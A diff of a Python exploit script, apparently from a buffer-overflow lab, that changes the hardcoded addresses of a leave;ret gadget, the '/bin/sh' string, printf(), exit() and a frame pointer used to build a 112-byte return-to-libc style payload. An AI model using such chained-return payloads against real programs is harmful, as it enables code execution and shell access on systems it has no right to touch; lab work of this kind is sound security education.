@@ -4,11 +4,11 @@ import sys
 def tobytes (value):
    return (value).to_bytes(4,byteorder='little')
 
-leaveret    = 0x08048565   # Address of leaveret
-sh_addr     = 0xbffffdd0   # Address of "/bin/sh"
-printf_addr = 0xb7e51670   # Address of printf()
-exit_addr   = 0xb7e369d0   # Address of exit()
-ebp_foo     = 0xbfffe4c8   # foo()'s frame pointer
+leaveret    = 0x565562ce   # Address of leaveret
+sh_addr     = 0xffffdfe4   # Address of "/bin/sh"
+printf_addr = 0xf7e21de0   # Address of printf()
+exit_addr   = 0xf7e05f80   # Address of exit()
+ebp_foo     = 0xffffc8f8   # foo()'s frame pointer
 
 content   = bytearray(0xaa for i in range(112))
 
